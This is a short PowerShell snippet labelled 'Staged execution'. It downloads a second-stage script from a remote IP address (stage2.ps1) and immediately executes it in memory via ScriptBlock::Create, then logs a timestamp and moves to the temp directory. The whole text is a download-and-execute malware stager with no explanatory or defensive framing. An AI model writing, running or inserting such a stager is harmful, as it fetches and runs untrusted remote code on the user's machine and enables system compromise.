
<# Staged execution #> $DownloadedScript = (New-Object Net.WebClient).DownloadString("http://198.51.100.167/stage2.ps1"); & ([ScriptBlock]::Create($DownloadedScript)); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Set-Location -Path $env:TEMP
